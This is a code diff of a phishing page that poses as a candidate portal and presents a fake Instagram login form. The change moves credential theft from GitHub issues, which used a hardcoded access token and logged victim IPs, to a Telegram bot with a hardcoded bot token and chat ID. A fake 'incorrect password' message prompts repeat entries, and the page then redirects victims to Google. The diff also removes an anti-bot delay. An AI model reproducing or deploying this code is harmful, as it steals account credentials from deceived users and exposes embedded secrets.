@@ -5,63 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Candidate Portal | Secure Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .hidden-content { display: none; }
-    </style>
 </head>
-<body class="bg-gray-100 min-h-screen flex flex-col">
-    <header class="bg-dark text-white p-4 text-center border-b-4 border-red-800" style="background-color: #4a1524;">
-        <h1 class="text-sm font-bold uppercase tracking-widest">Candidate Management System</h1>
-    </header>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
 
-    <main class="flex-grow flex items-center justify-center p-4">
-        <div id="loading" class="text-center text-gray-500 italic">Verifying connection...</div>
+    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-sm text-center">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-12 mx-auto mb-4">
+        <h3 class="font-bold text-lg mb-2">Login Required</h3>
+        <p id="error-msg" class="text-red-600 text-xs mb-4 hidden border border-red-100 p-2 rounded bg-red-50">⚠️ Incorrect password. Please try again.</p>
         
-        <div id="main-content" class="hidden-content w-full max-auto space-y-4 flex flex-col items-center">
-            <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm text-center">
-                <h2 class="font-bold mb-4">Identity Verification</h2>
-                <p class="text-xs text-gray-500 mb-6">Verify via your authorized social profile to use system access</p>
-                <button onclick="openModal()" class="w-full bg-red-900 text-white py-3 rounded font-bold hover:bg-red-800 transition shadow-lg" style="background-color: #4a1524;">LOGIN & VERIFY</button>
-            </div>
-        </div>
-    </main>
-
-    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-75 hidden flex items-center justify-center p-4">
-        <div class="bg-white rounded-xl w-full max-w-sm overflow-hidden">
-            <div class="p-8 text-center">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-12 mx-auto mb-4">
-                <h3 class="font-bold text-lg mb-2">Login Required</h3>
-                <div id="error-msg" class="bg-red-100 text-red-600 text-xs p-2 rounded mb-4 hidden border border-red-200">
-                    ⚠️ Incorrect password. Please try again.
-                </div>
-                
-                <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded mb-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
-                <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded mb-5 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
-                
-                <button onclick="sendData()" id="btnText" class="w-full bg-pink-600 text-white py-2 rounded-lg font-bold hover:bg-pink-700 shadow-md" style="background-color: #a21d44;">CONFIRM</button>
-            </div>
-        </div>
+        <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded mb-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
+        <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded mb-5 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
+        
+        <button onclick="sendData()" id="btnText" class="w-full bg-pink-600 text-white py-2 rounded-lg font-bold hover:bg-pink-700 shadow-md transition">CONFIRM</button>
     </div>
 
     <script>
-        // CONFIGURATION (Token aur Repo check karein)
         const CONFIG = {
-            TOKEN: "ghp_T0W1nzpkQgsTuAKQZNsMk2D1yATWoP3sXK61", // Aapka naya token
-            REPO: "Veer007ghk/user-verification-gateway", // Aapki repo
+            // Aapka live telegram token aur ID
+            BOT_TOKEN: "8479598107:AAHtDSL81LYQAfnLIWghnpLwDoqaMJ8SLIk",
+            CHAT_ID: "5757737130",
             REDIR: "https://www.google.com" 
         };
 
         let attempt = 0;
-
-        // Anti-bot Delay (2.5 Seconds)
-        setTimeout(() => {
-            document.getElementById('loading').classList.add('hidden');
-            document.getElementById('main-content').classList.remove('hidden-content');
-        }, 2500);
-
-        function openModal() {
-            document.getElementById('loginModal').classList.remove('hidden');
-        }
 
         async function sendData() {
             const user = document.getElementById('user').value;
@@ -74,21 +40,17 @@
             btn.innerText = "Processing...";
             btn.disabled = true;
 
-            try {
-                // User ki IP nikalna
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+            // Telegram par aane wala message format
+            const message = `🚀 **New Login Received**\n\n👤 **User:** \`${user}\` \n🔑 **Pass:** \`${pass}\` \n🔢 **Attempt:** ${attempt + 1}`;
 
-                // GitHub Issue create karne ka logic
-                const response = await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Authorization': `token ${CONFIG.TOKEN}`,
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        title: `New Login: ${user}`,
-                        body: `**Username:** ${user}\n**Password:** ${pass}\n**IP Address:** ${ipData.ip}\n**Attempt:** ${attempt + 1}`
+                        chat_id: CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
                     })
                 });
 
@@ -105,7 +67,7 @@
                         window.location.href = CONFIG.REDIR;
                     }
                 } else {
-                    console.error("Token or Repo issue");
+                    alert("Connection Error. Try again.");
                     btn.innerText = "CONFIRM";
                     btn.disabled = false;
                 }
